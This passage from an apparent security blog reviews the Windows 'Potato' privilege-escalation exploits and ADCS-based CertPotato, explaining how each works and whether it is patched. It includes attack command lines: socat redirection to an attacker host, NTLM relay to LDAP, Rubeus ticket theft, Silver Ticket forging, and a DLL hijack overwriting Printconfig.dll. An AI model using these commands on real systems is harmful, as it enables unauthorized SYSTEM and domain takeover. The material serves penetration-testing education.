<li>The DCOM server will connect to the RPC server in order to perform the <code>IRemUnkown2::RemRelease</code> interface call. By connecting to the Named Pipe, an "<em>Autentication Callback</em>" will be performed and RoguePotato could impersonate the caller via a <code>RpcImpersonateClient()</code> call.</li>
<li>The <strong>NETWORK SERVICE</strong>'s token is stolen.</li>
</ol><p id="bkmrk-then%2C-a-token-steale" style="text-align: justify;">Then, a token stealer will :</p>
<ol id="bkmrk-get-the-pid-of-the-r" style="text-align: justify;"><li>Get the PID of the <strong>rpcss</strong> service</li>
<li>Open the process, list all handles and for each handle try to duplicate it and get the handle type</li>
<li>If handle type is "<strong>Token</strong>" and token owner is <strong>SYSTEM</strong>, try to impersonate and launch a process with <code>CreatProcessAsUser()</code> or <code>CreateProcessWithToken()</code> (classic sh*t now)</li>
</ol><h5 id="bkmrk-examples-of-command--5" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23on-the-attacker-mac"><code class="language-Powershell">#On the attacker machine, run the socat redirection
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

#On the target machine, as an account with impersonation privileges
.\RoguePotato.exe -r ATTACKER_IP -e "command" -l 9999</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-6" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-after-all-this-time-" style="text-align: justify;">After all this time ? Always.</p>
<p id="bkmrk-for-further-read%2C-it-6" style="text-align: justify;">For further read, it's <a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">here.</a></p>
<p id="bkmrk-source-code-6" style="text-align: justify;"><a href="https://github.com/antonioCoco/RoguePotato">Source code</a></p>
<h2 id="bkmrk-genericpotato" style="text-align: justify;">GenericPotato</h2>
<ul id="bkmrk-by-%40micahvandeusen%2C-"><li>By <a href="https://twitter.com/micahvandeusen">@micahvandeusen</a>, disclosed in 2021</li>
</ul><h5 id="bkmrk-how-it-works-8" style="text-align: justify;">How it works</h5>
<p id="bkmrk-this-one-is-a-little" style="text-align: justify;">This one is a little bit particular, it is more a "potato template" to <em>"grow our own potato"</em>. It is usefull if you are on a machine patched against JuicyPotato, where WinRM already run, the Print service is stopped, and the RPC port are filtered...basically you are in a CTF.<br>With impersonation privileges, the idea is to create an <strong>HTTP</strong> and <strong>Named Pipe</strong> listener in order to impersonate users making requests to it. The exploit doesn't permit to "<em>auto privesc</em>", but permits to listen, and when a request arrives from a SSRF or a file write for example, KABOUM ! The exploit executes the classic 401 Unauthorized attacks with the NTLM authentication.</p>
<h5 id="bkmrk-examples-of-command--6" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23listens-on-http%2C-po"><code class="language-Powershell">#Listens on HTTP, port 8000, and executes cmd.exe
./GenericPotato -e HTTP -l 8000</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-7" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes.">Yes.</p>
<p id="bkmrk-for-further-read%2C-it-7" style="text-align: justify;">For further read, it's <a href="https://micahvandeusen.com/the-power-of-seimpersonation/">here.</a></p>
<p id="bkmrk-source-code-7" style="text-align: justify;"><a href="https://github.com/micahvandeusen/GenericPotato">Source code</a></p>
<h2 id="bkmrk-remotepotato" style="text-align: justify;">RemotePotato</h2>
<ul id="bkmrk-by-%40decoder_it-and-%40-0" style="text-align: justify;"><li>By <a href="https://twitter.com/decoder_it">@decoder_it</a> and <a href="https://twitter.com/splinter_code">@splinter_code</a> for SentinelLABS, disclosed in 2021</li>
</ul><h5 id="bkmrk-how-it-works-9" style="text-align: justify;">How it works</h5>
<p id="bkmrk-the-last-but-not-the" style="text-align: justify;">The last but not the least, and maybe the most underrated exploit ! The starting point of this exploit is RoguePotato, but now the objective is to build a cross protocol relay from the <strong>RPC</strong> authentication to another protocol like <strong>LDAP</strong> or <strong>HTTP</strong> on a remote machine to perform a privilege escalation (or at least, actions as another user). This solution could permit to privesc without requiring any impersonation privileges.</p>
<p id="bkmrk-to-achieve-this%2C-an-" style="text-align: justify;"><a href="/uploads/images/gallery/2022-03/diYCu2ZD12374PIl-image-1647098961002.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2022-03/scaled-1680-/diYCu2ZD12374PIl-image-1647098961002.png" alt="image-1647098961002.png"></a>To achieve this, an authentication from an interesting account (like Domain Admin) without NTLM signing is needed. From the previous research, it appears that <code>IRemUnkown2</code> doesn't apply any signature. Also, it appears some CLSID impersonate the account connected in the Session immediatly after <strong>Session 0</strong>, and not the SYSTEM account as usual.<br>Basically, with a shell in Session 0, by triggering one of these particular CLSIDs an authentication for the user in Session 1 will arrive (or Session 2 if no more 1, that's bait).</p>
<p id="bkmrk-there-is-three-main-" style="text-align: justify;">There is three main ways to obtain a shell in <strong>Session 0</strong>:</p>
<ul id="bkmrk-connection-with-winr" style="text-align: justify;"><li>Connection with <strong>WinRM-PSSession</strong> or <strong>ssh</strong></li>
<li>A low privileged user granted as "Logon as a batch job" can run a scheduled task with the property "Run the task whether the user is logged in or not"</li>
<li>A service account</li>
</ul><p id="bkmrk-the-list-of-interest" style="text-align: justify;">The list of interesting CLSIDs can be found in the SentinelOne article in read further.</p>
<p id="bkmrk-with-a-shell-as-a-lo" style="text-align: justify;">With a shell as a low privileged user in <strong>Session 0</strong> on a machine where a privileged user is connected interactively, it is possible to trigger a DCOM activation by <em>unmarshaling</em> an <strong>IStorage object</strong>, calling <code>CoGetInstanceFromIstorage()</code> with a CLSID that can impersonate an interactive user and setting the attacker IP for the OXID resolution. The attacker who listen on the port 135 will receive the authenticate <code>IObjectExporter::ResolveOxid2</code> call and will forward it to the fake OXID Resolver. Because this call is signed, it can't be used for the NTLM relay.<br>Following this, still in the RoguePotato manner, the OXID resolver return a string binding to an RPC endpoint controlled by the attacker. The victim make the <code>IRemUnkown2::RemRelease</code> call on the RPC server, <strong>without the Sign flag</strong>. At this point, the authentication can be relayed to the desired ressource (LDAP, HTTP, etc).</p>
<p id="bkmrk-for-the-relay-purpos" style="text-align: justify;">For the relay purpose, all the MITM and HTTP logic is present in the RemotePotato POC, which then forward the authentication to ntlmrelayx which do its job. Because I can't make a better schema than the SentinelOne ones, here it is :</p>
<p id="bkmrk--1" class="align-center"><a href="/uploads/images/gallery/2022-03/8k65PXrWXYvoXv0J-image-1647099949663.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2022-03/scaled-1680-/8k65PXrWXYvoXv0J-image-1647099949663.png" alt="Totally stolen here" width="653" height="368"></a><em>Totally stolen <a href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/"><span style="text-decoration: underline;">here</span></a></em></p>
<p id="bkmrk-%C2%A0-0" style="text-align: justify;">During the research they have found that the lack of signing was induced by the security provider choosen in the fake OXID resolver response. If it is set to <strong>NTLM</strong> (<code>RPC_C_AUTHN_WINNT</code>) with an Authentication Level at <code>RPC_AUTHN_LEVEL_CONNECT (0x2)</code> no signature will be setup. However, by specifying <strong>SPNEGO</strong> (<code>RPC_C_AUTHN_GSS_NEGOTIATE</code>) no signature will be enforced.</p>
<p id="bkmrk-the-exploit-has-now-" style="text-align: justify;">The exploit has now been updated and it is possible to use it from another Session than 0, and to relay another one than the 1.</p>
<h5 id="bkmrk-examples-of-command--7" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23on-the-attacker-mac-0"><code class="language-Powershell">#On the attacker machine, run the socat redirection
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999 &amp;
#And the relay to the LDAP for example
ntlmrelayx.py -t ldap://DC-IP --no-wcf-server --escalate-user normal_user

#Open a session on the victim machine
Enter-PSSession -ComputerName victimMachine
#On the machine, run the RemotePotato exploit
./RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-8" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes.-and-for-a-long-" style="text-align: justify;">Finally, nop. After a long time of "<em>it's not a bug, it's a feature</em>", Microsoft has silently patched the exploit on October 2022 by changing the client authentication level from <code>Packet Integrity</code> to <code>Connect</code>, leading to NTLM signing activation.</p>
<p id="bkmrk-for-further-read%2C-it-8" style="text-align: justify;">For further read, it's <a href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/">here.</a></p>
<p id="bkmrk-source-code-8" style="text-align: justify;"><a href="https://github.com/antonioCoco/RemotePotato0">Source code</a></p>
<h2 id="bkmrk-juicypotatong">JuicyPotatoNG</h2>
<ul id="bkmrk-by-%40decoder_it-and-%40-1"><li>By <a href="https://twitter.com/decoder_it">@decoder_it</a> and <a href="https://twitter.com/splinter_code">@splinter_code</a>, disclosed in 2022</li>
</ul><h5 id="bkmrk-how-it-works-10">How it works</h5>
<p id="bkmrk-after-the-juicypotat">Imagine JuicyPotato can still works ! Ahah no I'm kidding...but imagine...</p>
<p id="bkmrk-after-the-juicypotat-0">After the JuicyPotato release, Microsoft has made important modifications about the abusable CLSIDs by changing the obtained token to an <strong>Indentification</strong> token. Additionally, it was needed to belong to the <strong>INTERACTIVE</strong> group to exploit the other CLSIDs (<em>PrintNotify</em> for example), which is not at all common.</p>
<p id="bkmrk-juicypotatong-is-bas">JuicyPotatoNG is based on the <a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">Kerberos DCOM authentication trick</a> presented by <a href="https://twitter.com/tiraniddo">James Forshaw</a>, which basically permits authentication relay from a local user Kerberos token to LDAP.  During the DCOM object activation, by calling the <code>LogonUser()</code> API with a <strong>Logon Type 9</strong> (<code>NewCredentials</code>) LSASS creates a copy of the token and adds the <strong>INTERACTIVE</strong> SID to the new one (along the other SIDs). This  new token can be impersonated without <em>impersonation</em> privileges since it has been created with <code>LogonUser()</code>.</p>
<p id="bkmrk-next%2C-the-system-aut" style="text-align: justify;">Next, the <strong>SYSTEM</strong> authentication is intercepted and the user impersonated with an SSPI hook on the <code>AcceptSecurityContext()</code> function. Using this solution instead of <code>RpcImpersonateClient()</code> permits to listen on a specific port (here <strong>10247</strong>, because it is generally available for none privileged users) without blocking it (binding to a port with <code>RpcServerUseProtseqEp()</code> will make it busy and not available for other processes). Additionnally, this approach only needs <strong>SeAssignPrimaryTokenPrivilege</strong>, where <code>RpcImpersonateClient()</code> also needs the <strong>SeImpersonatePrivilege </strong>privilege.</p>
<h5 id="bkmrk-examples-of-command--8" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23using-the-default-1"><code class="language-Powershell">#Using the default 10247 port with CreateProcessWithTokenW or CreateProcessAsUser createprocess call
./JuicyPotatoNG.exe -p C:\Windows\System32\powershell.exe -t *

#Using a different port to listen on
./JuicyPotatoNG.exe -p C:\Windows\System32\powershell.exe -t * -l 1337</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-9" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes%2C-normally-it-sho">Yes, normally it should.</p>
<p id="bkmrk-for-further-read%2C-it-9">For further read, it's <a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">here</a> for the article, <a href="https://decoder.cloud/2020/05/30/the-impersonation-game/">here</a> for Juicy2, and <a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">here</a> for the James Forshaw explains.</p>
<p id="bkmrk-source-code-9" style="text-align: justify;"><a href="https://github.com/antonioCoco/JuicyPotatoNG">Source code</a></p>
<h2 id="bkmrk-certpotato" style="text-align: justify;">CertPotato</h2>
<ul id="bkmrk-by-%40sant0rryu%2C-discl"><li>By <a href="https://twitter.com/Sant0rryu"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@Sant0rryu</span></a>, disclosed in 2022</li>
</ul><h5 id="bkmrk-how-it-works-11">How it works</h5>
<p id="bkmrk-and-you-really-thoug" style="text-align: justify;">And you really thought no one was going to use ADCS to build an exploit <em>*Potato</em>?</p>
<p id="bkmrk-certpotato-is%2C-for-t" style="text-align: justify;">CertPotato is, for the moment, not a binary that you can ./ to gain in privileges, but more a technique to achieve a privilege escalation from a service account to the SYSTEM account via  ADCS without using the NTLM relay attack.</p>
<p id="bkmrk-this-article-will-no" class="callout info" style="text-align: justify;">This article will not explain what is ADCS and how Microsoft has implemented its own PKI, this is not the goal here. For better understanding of the ADCS attacks, you can look at <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">this</a> and <a href="https://www.thehacker.recipes/ad/movement/ad-cs">this</a>, or read the SpecterOps' <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">whitepaper</a>.</p>
<p id="bkmrk-when-a-service-accou" style="text-align: justify;">When a service account like "<strong>NT AUTHORITY\SYSTEM</strong>", "<strong>NT AUTHORITY\Network Service</strong>", or a virtual account like "<strong>iis apppool\defaultapppool</strong>" needs to interact with the network, it uses the machine account. So, if you have a code execution on a web server as "<strong>iis apppool\defaultapppool</strong>", and the server is domain joined, you can request the domain users with the <code>net</code> command, and the machine account will be used to perform the request.</p>
<p id="bkmrk-back-in-2020%2C-charli" style="text-align: justify;">Back in 2020, <a href="https://twitter.com/exploitph">Charlie Clark</a> had already exploited this behavior to perform an RBCD attack via the <a href="https://exploit.ph/delegate-2-thyself.html"><em>tgtdeleg</em> trick</a>. This technique permits to retrieve a TGT for the machine account from a service account by sending an <strong>AP_REQ</strong> request to a machine in Unconstrained Delegation (basically, the Domain Controller), and decrypting the AP-REQ <em>authenticator</em> structure with the session key (grabbed in the local Kerberos cache) to extract the TGT and the associated session key placed in it.</p>
<p id="bkmrk-with-this-informatio" style="text-align: justify;">With this information in mind, you can potentially imagine a pattern of attack:</p>
<ol id="bkmrk-with-rubeus%2C-as-the-"><li style="text-align: justify;">With <strong>Rubeus</strong>, as the service account, we perform the <code>tgtdeleg</code> attack to retrieve a machine's TGT</li>
<li style="text-align: justify;">We reuse this ticket with <strong>Certipy</strong> to request a certificate for the machine account</li>
<li style="text-align: justify;">This certificate can be used to perform a PKINIT authentication and extract the machine account's NT hash via <em>UnPac-The-Hash</em></li>
<li style="text-align: justify;">We forge a Silver Ticket for an admin account with the machine account's hash retrieved</li>
<li style="text-align: justify;">Hack the World</li>
</ol><h5 id="bkmrk-examples-of-command--9" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23in-the-service-acco"><code class="language-shell">#In the service account context
.\Rubeus.exe tgtdeleg /nowrap

#Then, in your Kali
#Copy/Paste the Base64 ticket and convert it to a ccache ticket with Impacket
echo "&lt;base64_ticket&gt;" |base64 -d &gt; ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache

#Use Certipy to request a certificate for the machine account with a Kerberos authentication
export KRB5CCNAME=./ticket.ccache
certipy req -k -target 'ca_host' -ca 'ca_name' -template 'Machine'

#Use the certificate to perform a PKINIT authentication and extract the NT Hash
certipy auth -pfx 'machine.pfx' -no-save

#Forge a Silver Ticket with Impacket
ticketer.py -domain domain.local -domain-sid &lt;domain_SID&gt; -spn 'cifs/machine' -nthash &lt;machine_hash&gt; &lt;target_user&gt;</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-10" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes.-0">Yes.</p>
<p id="bkmrk-for-further-read%2C-it-10">For further read, it's <a href="https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/">here</a>, and <a href="https://exploit.ph/delegate-2-thyself.html">here</a>. More explains about ADCS <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">here</a>, <a href="https://www.thehacker.recipes/ad/movement/ad-cs">here</a>, and <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">here</a>.</p>
<p id="bkmrk-rubeus%2C-impacket%2C-ce"><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>, <a href="https://github.com/ly4k/Certipy">Certipy</a></p>
<h2 id="bkmrk-localpotato" style="text-align: justify;">LocalPotato</h2>
<ul id="bkmrk-by-%40decoder_it-and-%40-2"><li>By <a href="https://twitter.com/decoder_it">@decoder_it</a> and <a href="https://twitter.com/splinter_code">@splinter_code</a>, disclosed in 2023</li>
</ul><h5 id="bkmrk-how-it-works-12">How it works</h5>
<p id="bkmrk-yup%2C-they-did-it-aga" style="text-align: justify;">Yup, they did it again...but this time differently, and without impersonation privileges ! For a quick remember, during a local NTLM authentication the <strong>Type 2 message</strong> sent by the server to the client (which are on the same machine, this is local), contains the <code>Negotiate Local Call</code> flag that is used the determine the validity of the security context. Additionally, the <code>Reserved</code> field must reference the local server context handle that the client should associate to.</p>
<p id="bkmrk-if-the-lsass-doesn%27t" style="text-align: justify;">If the LSASS doesn't correctly check the validity of this field, it could be possible to initiate a connection against a server service as an unprivileged client, swap the context in the received <strong>Type 2 message</strong> with a one from an intercepted privileged authentication, and then authenticate with the unprivileged client on behalf of the privileged one. Here are the steps decribed in the article:</p>
<ol id="bkmrk-obtain-a-privileged-"><li style="text-align: justify;">Obtain a privileged authentication (yeah, from the <strong>SYSTEM</strong>) on a controlled server, for example with a coercion attack</li>
<li style="text-align: justify;">Initiate a local NTLM authentication with a controlled unprivileged client against a server service (the server is the local machine where we want to privesc here)</li>
<li style="text-align: justify;">Intercept the <strong>Type 2 message</strong> coming from the server service for our unprivileged client and extract the <code>Reserved</code> field value (called "Context B" here)</li>
<li style="text-align: justify;">Extract the "Context A" value from the<strong> Type 2 message</strong> generated by our server for the privileged client</li>
<li style="text-align: justify;">Swap the two contexts in order that the unprivileged client will authenticate with the context of the privileged one, <em>and vice versa</em></li>
<li style="text-align: justify;">Just forward the empty <strong>Type 3 messages </strong>to complete both authentications</li>
<li style="text-align: justify;">Normally, now the LSASS process will associate the privileged "Context A" with the unprivileged client (which is under our control), and the unpriviliged "Context B" with the normally priviliged client (sorry buddy...)</li>
</ol><p id="bkmrk-okay%2C-that%27s-good%2C-b" style="text-align: justify;">Okay, that's good, but how to coerce a privileged authentication from the SYSTEM and locally relay it to a usefull server service ? RPC endpoints are protected against local NTLM relay by denying RPC connections if they are coming from the local SYSTEM, and SMB endpoints are normally also protected against cross-protocol relay attack since 2016...all ? No ! Because a technique described by <a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">James Forshaw</a> still resists to the mitigation, and the life is not easy for the Microsoft engineers...</p>
<p id="bkmrk--2"><a href="/uploads/images/gallery/2023-02/3OxeZ4TOsTIZiMKA-asterix.jpg" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2023-02/scaled-1680-/3OxeZ4TOsTIZiMKA-asterix.jpg" alt="asterix.jpg"></a></p>
<p id="bkmrk-smb-mitigation-is-ba" style="text-align: justify;">SMB mitigation is based on the fact that a local authentication must specify the target SPN <code>cifs/127.0.0.1</code>. With this behavior it is, for example, not possible to coerce a WebDAV authentication and relay it to the SMB service since the SPNs will mismatch (it works for both Kerberos and NTLM authentications). However, it appears that it is possible to trick a DCOM client into using an arbitrary SPN to obtain a Kerberos ticket for an arbitrary service, and this also works for NTLM authentications.</p>
<p id="bkmrk-thus%2C-by-coercing-a-" style="text-align: justify;">Thus, by coercing a SYSTEM NTLM authentication over <strong>DCOM/RPC</strong> (this abuses <em>COM marshaling</em> with specific CLSIDs, take a look at how<a title="In the Potato family, I want them all" href="/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-remotepotato"> RemotePotato</a> works) and specifying the SPN <code>cifs/127.0.0.1</code> in the OXID resolver, it is possible to bypass the SMB reflection mitigations and obtain a privileged arbitrary file write on the system. Then, it is up to you to find an interesting file to write in order to leverage the arbitrary write into a code execution. Generally, in this situation <strong>DLL hijacking</strong> got your back.</p>
<p id="bkmrk-to-be-more-local%2C-th" style="text-align: justify;">To be more <em>local</em>, the authors of the tool have decided to rely on a local fake OXID resolver instead of a remote one as it is done generally.</p>
<h5 id="bkmrk-examples-of-command--10" style="text-align: justify;">Examples of command lines</h5>
<p id="bkmrk-in-the-author%27s-arti">In the author's article, they present an example where they hijack the <code>printconfig.dll</code> DLL and then trigger the <strong>PrintNotify</strong> service that uses this DLL with the SYSTEM rights. But as indicated previously, this attack can work with any other interesting DLL run as SYSTEM.</p>
<pre id="bkmrk-%23with-the-mcpmanagem"><code class="language-Powershell">#With the McpManagementService CLSID which is present by default on Windows 11 and Server 2022
./LocalPotato.exe -i C:\temp\evil.dll -o C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll -c {A9819296-E5B3-4E67-8226-5E72CE9E1FB7}

#Then trigger the PrintNotify service, via its CLSID, that will use the hijacked DLL
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-11" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-on-up-to-date-system">On up-to-date system, nop. The attack has been identified as the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21746">CVE-2023-21746</a> and patched in january 2023. Now, the SPN is automatically set to NULL when the <code>ISC_REQ_UNVERIFIED_TARGET_NAME</code> flag is set by the DCOM privileged client.</p>
<p id="bkmrk-for-further-read%2C-it-11">For further read, it's <a href="https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/">here</a> and <a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">here</a>.</p>
<p id="bkmrk-source-code-10"><a href="https://github.com/decoder-it/LocalPotato">Source code</a></p>
<h2 id="bkmrk-coercedpotato" style="text-align: justify;">CoercedPotato</h2>
<ul id="bkmrk-by-%40prepouce_-and-%40h"><li>By <a class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-xoduu5 r-1wbh5a2 r-dnmrzs r-1ny4l3l" tabindex="-1" role="link" href="https://twitter.com/Prepouce_"><span class="css-901oao css-16my406 css-1hf3ou5 r-1bwzh9t r-18u37iz r-37j5jr r-1wvb978 r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0" dir="ltr" style="text-overflow: unset;"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0" style="text-overflow: unset;">@Prepouce_</span></span></a> and <a class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-xoduu5 r-1wbh5a2 r-dnmrzs r-1ny4l3l" tabindex="-1" role="link" href="https://twitter.com/Hack0ura"><span class="css-901oao css-16my406 css-1hf3ou5 r-1bwzh9t r-18u37iz r-37j5jr r-1wvb978 r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0" dir="ltr" style="text-overflow: unset;"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0" style="text-overflow: unset;">@Hack0ura</span></span></a>, disclosed in 2023</li>
</ul><h5 id="bkmrk-how-it-works-13" style="text-align: justify;">How it works</h5>
<p id="bkmrk-some-days-ago%2C-i-hav" style="text-align: justify;">Some days ago, I have Tweeted (Xed ?) about a now Potato exploit developed by colleagues. This is finally the summary of their article.</p>
<p id="bkmrk-this-new-potato-is-i" style="text-align: justify;">This new potato is inspired by the <a href="/books/windows-sNL/page/in-the-potato-family-i-want-them-all#bkmrk-printspoofer">PrintSpoofer exploit</a> created by <a href="https://twitter.com/itm4n">@itm4n</a> in 2020. However, if the principle remanes the same, it has been improved with many recently discovered vulnerable RPC calls (for exemple, the RPC calls exploited by <a href="https://github.com/topotam/PetitPotam">PetitPotam</a>). Now, with code execution on a machine with an account who has impersonation privileges, it is possible to escalate to the <strong>NT AUTHORIY\SYSTEM</strong> account with other calls than the printer ones, which are not always available.</p>
<p id="bkmrk-here-are-the-steps-f" style="text-align: justify;">Here are the steps for the impersonation:</p>
<ul id="bkmrk-a-new-pipe-server-is" style="text-align: justify;"><li>A new pipe server is opened on the machine where we have code execution, with the function <code>CreateNamedPipe()</code>. Depending on the RPC call that will be exploited, a different named pipe will be used</li>
<li>The server is put on connection hold with <code>ConnectNamedPipe()</code></li>
<li>When a connection arrives, the process switch to the client security context for the rest of the instructions with <code>ImpersonateNamedPipeClient()</code></li>
<li>The session token associated to the impersonated client is retrieved with <code>OpenThreadToken()</code> and it is duplicated with <code>DuplicateTokenEx()</code></li>
<li>After some setups, a new process with the new token is started with <code>CreateProcessAsUser()</code> if the <code>SeAssignPrimaryToken</code> privilege is held. If it's <code>SeImpersonatePrivilege</code>, <code>CreateProcessWithTokenW()</code> will be used</li>
</ul><p id="bkmrk-since-rpc-calls-will" style="text-align: justify;">Since RPC calls will be used for the authentication coercion, a <strong>RPC binding handle</strong> is needed. It is basically a RPC link with the RPC server (here, localhost) that will serve to contact the different RPC interfaces. The function <code>RpcStringBindingCompose()</code> permits to define how the RPC connection must be setup with different parameters, and <code>RpcBindingFromStringBinding()</code> effectively establishes the link with the server.</p>
<p id="bkmrk-finally%2C-to-call-an-" style="text-align: justify;">Finally, to call an RPC interface, a compiled version of the interface's client is required. This file is called an <strong>IDL file</strong> (Interface Definition File). I'm not going to go into the meandering explanations of how to create IDL files here, but instead invite you to read the original article of CoercedPotato which is very well explained.</p>
<p id="bkmrk--3"><a href="/uploads/images/gallery/2023-10/2UkVSd77a7UtESOb-image-1698615881623.jpg" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2023-10/scaled-1680-/2UkVSd77a7UtESOb-image-1698615881623.jpg" alt="image-1698615881623.jpg"></a></p>
<p id="bkmrk-at-this-point%2C-the-i" style="text-align: justify;">At this point, the IDL files will serve to call the RPC interface, and the target named pipe in the RPC call will be specified with the same trick as for PrintSpoofer, i. e. with the <code>/ \</code> confusion (for example, <code>"\\\\127.0.0.1/pipe/coerced\\C$\\\x00"</code>), to avoid an access denied on an already in use named pipe. When the SYSTEM authentication arrives on the controlled named pipe, it is impersonated as described above, and reused to own the system.</p>
<p id="bkmrk-for-the-moment%2C-the-" style="text-align: justify;">For the moment, the following RPC calls are supported. New ones will be added later:</p>
<pre id="bkmrk-ms-rprn-%3A-%5B0%5D-rpcrem"><code class="language-">ms-rprn : 
	[0] RpcRemoteFindFirstPrinterChangeNotificationEx()
	[1] RpcRemoteFindFirstPrinterChangeNotification()
ms-efsr :
	[0] EfsRpcOpenFileRaw()
	[1] EfsRpcEncryptFileSrv()
	[2] EfsRpcDecryptFileSrv()
	[3] EfsRpcQueryUsersOnFile()
	[4] EfsRpcQueryRecoveryAgents()
	[5] EfsRpcRemoveUsersFromFile()
	[6] EfsRpcAddUsersToFile()
	[7] EfsRpcDuplicateEncryptionInfoFile()
	[8] EfsRpcAddUsersToFileEx()
	[9] EfsRpcGetEncryptedFileMetadata()
	[10] EfsRpcEncryptFileExSrv()
	[11] EfsRpcQueryProtectors()</code></pre>
<h5 id="bkmrk-examples-of-command--11" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-.%5Ccoercedpotato.exe-"><code class="language-Powershell">.\CoercedPotato.exe -c whoami</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-12" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-oooh-yeah-%21-on-any-u">Oooh yeah ! On any up-to-date systems. The exploit has been tested on Windows 10, Windows 11 and Server 2022.</p>
<p id="bkmrk-for-further-read%2C-it-12">For further read, it's <a href="https://blog.hackvens.fr/articles/CoercedPotato.html">here</a> (in french).</p>
<p id="bkmrk-source-code-11"><a href="https://github.com/hackvens/CoercedPotato">Source code</a></p>
<h2 id="bkmrk-final-thoughts" style="text-align: justify;">Final thoughts</h2>
<p id="bkmrk-the-number-of-exploi" style="text-align: justify;">The number of exploits in the potato family is mainly due to the cat-and-mouse game that Microsoft and cybersecurity researchers have been playing since the beginning by patching bypass after bypass. But overall, the concept remains the same, and as long as NTLM can be relayed, privesc will always exist (it's beautiful).</p>
<h2 id="bkmrk-resources" style="text-align: justify;">Resources</h2>
<ul id="bkmrk-introduction-to-the-"><li class="align-left">NTLM Relay explains : <a href="https://en.hackndo.com/ntlm-relay/">https://en.hackndo.com/ntlm-relay/</a></li>
<li class="align-left">Introduction to the main potatoes : <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html</a></li>
<li class="align-left">Hot Potato : <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></li>
<li class="align-left">RottenPotato : <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></li>
<li class="align-left">LonelyPotato : <a href="https://decoder.cloud/2017/12/23/the-lonely-potato/">https://decoder.cloud/2017/12/23/the-lonely-potato/</a></li>
<li class="align-left">JuicyPotato :
<ul><li class="align-left"><a href="http://ohpe.it/juicy-potato/">http://ohpe.it/juicy-potato/ </a></li>
<li class="align-left"><a href="https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/">https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/</a></li>
</ul></li>
<li>GhostPotato : <a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html</a></li>
<li class="align-left">SweetPotato :
<ul><li class="align-left"><a href="https://www.pentestpartners.com/security-blog/sweetpotato-service-to-system/">https://www.pentestpartners.com/security-blog/sweetpotato-service-to-system/</a></li>
